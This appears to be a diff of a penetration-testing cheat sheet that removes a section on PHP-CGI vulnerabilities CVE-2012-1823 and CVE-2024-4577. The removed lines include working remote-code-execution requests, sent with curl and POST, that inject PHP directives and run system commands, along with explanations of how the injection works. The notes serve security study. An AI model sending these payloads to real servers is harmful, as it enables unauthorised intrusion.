@@ -11,9 +11,6 @@
 - [Chisel](#chisel)
 - [CrackMapExec / NetExec](#crackmapexec--netexec)
 - [Curl](#curl)
-- [CVE](#cve)
-	- [CVE-2012-1823 | PHP-CGI](#cve-2012-1823--php-cgi)
-	- [CVE-2024-4577 | PHP-CGI](#cve-2024-4577--php-cgi)
 - [Dig](#dig)
 - [Dnsenum](#dnsenum)
 - [Enum4linux-ng](#enum4linux-ng)
@@ -169,6 +166,7 @@
 - [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
 - [Shares](#shares)
 - [Snaffler](#snaffler)
+
 
 ---
 
@@ -567,52 +565,6 @@ Subdomains via crt.sh:
 ```bash
 curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
 ```
-
----
-
-## CVE
-
-### CVE-2012-1823 | PHP-CGI
-
-https://github.com/K3ysTr0K3R/CVE-2012-1823
-
-https://pentesterlab.com/exercises/cve-2012-1823
-
-You can check if return the source code with `?-s`
-Version before 5.3.12 or 5.4.2
-
-```bash
-echo "<?php system('uname -a');die(); ?>" | POST "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
-```
-
-Or with curl
-
-```bash
-curl -s "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
-  --data-binary "<?php system('uname -a'); die(); ?>"
-```
-
-When php-cgi don't found '=' transform to a parameter of cgi '-'.
-
-```
-?-d allow_url_include=1 -d auto_prepend_file=php://input
-```
-
-- `-d`: Allow to define directives in time of execution
-- `allow_url_include=1`: Active the option that allow include source code from remote sources.
-- `auto_prepend_file=php//input`: auto_prepend_file say to php, before execute any script, execute the following file. `php://input` is an stream that represent the raw body of the HTTP request
-
-With `die()` you're indicating that doesn't want to execute nothing more, so you will only see the result.
-
-The solution of this was detect special characters like `-`.
-
-### CVE-2024-4577 | PHP-CGI
-
-Very similar to CVE-2012-1823. In Windows exist Best Fit Mapping that maps certain Unicode characters to a useful character in a local language of the Windows computer.
-
-The key mapping is the soft hyphe, 0xAD. The 2012 path doesn't detect such as normal hyphen, so they send to PHP. Best-fit transform the 0xAD to a real hyphen 0X2D.
-
-XAMP by default is configurated with CGI by default.
 
 ---
 
